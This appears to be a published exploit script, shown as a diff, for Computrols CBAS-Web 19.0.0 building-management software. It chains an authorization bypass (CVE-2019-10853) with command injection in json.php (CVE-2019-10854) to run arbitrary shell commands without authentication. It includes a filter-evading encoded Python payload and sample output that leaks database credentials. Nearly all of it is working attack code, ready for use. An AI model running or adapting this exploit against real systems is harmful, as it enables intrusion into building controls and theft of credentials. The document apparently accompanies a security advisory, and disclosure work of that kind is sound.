@@ -1,0 +1,157 @@
+# Exploit Title: CBAS-Web 19.0.0 - Remote Code Execution
+# Google Dork: NA
+# Date: 2019-11-11
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.computrols.com/capabilities-cbas-web/
+# Software Link: https://www.computrols.com/building-automation-software/
+# Version: 19.0.0
+# Tested on: NA
+# CVE : N/A
+# Advisory: https://applied-risk.com/resources/ar-2019-009
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+
+#!/usr/bin/env python
+
+'''
+  Computrols CBAS-Web Unauthenticated Remote Command Injection Exploit
+  Affected versions: 19.0.0 and below
+    by Sipke Mellema, 2019
+
+
+  Uses two vulnerabilities for executing commands:
+    - An authorization bypass in the auth module (CVE-2019-10853)
+    - A code execution vulnerability in the json.php endpoint (CVE-2019-10854)
+  
+  Example usage: 
+  $ python CBASWeb_19_rce.py 192.168.1.250 "cat /var/www/cbas-19.0.0/includes/db.php"
+      ------------==[CBAS Web v19 Remote Command Injection
+
+      [*] URL: http://192.168.1.250/
+      [*] Executing: cat /var/www/cbas-19.0.0/includes/db.php
+      [*] Cookie is authenticated
+      [*] Creating Python payload..
+      [*] Sending Python payload..
+      [*] Server says:
+      <?php
+      // Base functions for database access
+      // Expects a number of constants to be set.  Set settings.php
+
+      // Only allow local access to the database for security purposes
+      if(defined('WINDOWS') && WINDOWS){
+          define('MYSQL_HOST', '192.168.1.2');
+          define('DB_USER', 'wauser');
+          define('DB_PASS', 'wapwstandard');
+          /*define('DB_USER', 'root');
+          define('DB_PASS', 'souper secrit');*/
+          ...
+
+'''
+
+import requests
+import sys
+import base64 as b
+import json
+
+
+def debug_print(msg, level=0):
+  if level == 0:
+    print "[*] %s" % msg
+  if level == 1:
+    print "[-] %s" % msg
+
+# Check parameters
+if len(sys.argv) < 3:
+  print "Missing target parameter\n\n\tUsage: %s <IP or hostname> \"<cmd>\"" % __file__
+  exit(0)
+
+print "------------==[CBAS Web v18 Remote Command Injection\n"
+
+# Set host, cookie and URL
+host = sys.argv[1]
+cookies = {'PHPSESSID': 'comparemetoasummersday'}
+url = "http://%s/" % host
+
+debug_print("URL: %s" % url)
+
+# Command to execute
+# Only use single quotes in cmd pls
+icmd = sys.argv[2]
+if '"' in icmd:
+  debug_print("Please don't use double quotes in your command string", level = 1)
+  exit(0)
+
+debug_print("Executing: %s" % icmd)
+
+# URL for performing auth bypass by setting the auth cookie flag to true
+auth_bypass_req = "cbas/index.php?m=auth&a=agg_post&code=test"
+# URL for removing auth flag from cookie (for clean-up)
+logout_sess_req = "cbas/index.php?m=auth&a=logout"
+# URL for command injection and session validity checking
+json_checks_req = "cbas/json.php"
+
+# Perform logout
+def do_logout():
+  requests.get(url + logout_sess_req, cookies = cookies)
+
+# Check if out cookie has the authentication flag
+def has_auth():
+  ret = requests.get(url + json_checks_req, cookies = cookies)
+  if ret.text == "Access Forbidden":
+    return False
+  return True
+
+# Set auth flag on cookie
+def set_auth():
+  requests.get(url + auth_bypass_req, cookies = cookies)
+
+# =======================================================
+
+# Perform auth bypass if not authenticated yet
+if not has_auth():
+  debug_print("Cookie not yet authenticated")
+  debug_print("Setting auth flag on cookie via auth bypass..")
+  set_auth()
+
+# Check if bypass failed
+if not has_auth():
+  debug_print("Was not able to perform authorization bypass :(")
+  debug_print("Exploit failed, quitting..", level = 1)
+  exit(0)
+
+else:
+  debug_print("Cookie is authenticated")
+  debug_print("Creating Python payload..")
+
+  # Payload has to be encoded because the server uses the following filtering in exectools.php:
+  #   $bad = array("..", "\\", "&", "|", ";", '/', '>', '<');
+  # So no slashes, etc. This means only two "'layers' of quotes"
+  
+  # Create python code exec code
+  cmd_python = 'import os; os.system("%s")' % icmd
+  # Convert to Python array
+  cmd_array_string = str([ord(x) for x in cmd_python])
+  # Create command injection string
+  p_unencoded = "DispatchHistoryQuery\t-i \"$(python -c 'exec(chr(0)[0:0].join([chr(x) for x in %s]))')\"" % cmd_array_string
+  # Base64 encode for p parameter
+  p_encoded = b.b64encode(p_unencoded)
+
+  # Execute command
+  debug_print("Sending Python payload..")
+  ret = requests.post(url + json_checks_req, cookies = cookies, data = {'p': p_encoded})
+
+  # Parse result
+  ret_parsed = json.loads(ret.text)
+  try:
+    metadata = ret_parsed["metadata"]
+    identifier = metadata["identifier"]
+
+    debug_print("Server says:")
+    print identifier
+
+  # JSON Parsing error
+  except:
+    debug_print("Error parsing result from server :(", level = 1)
+
+# Uncomment if you want the cookie to be removed after use
+# debug_print("Logging out")
+# do_logout()
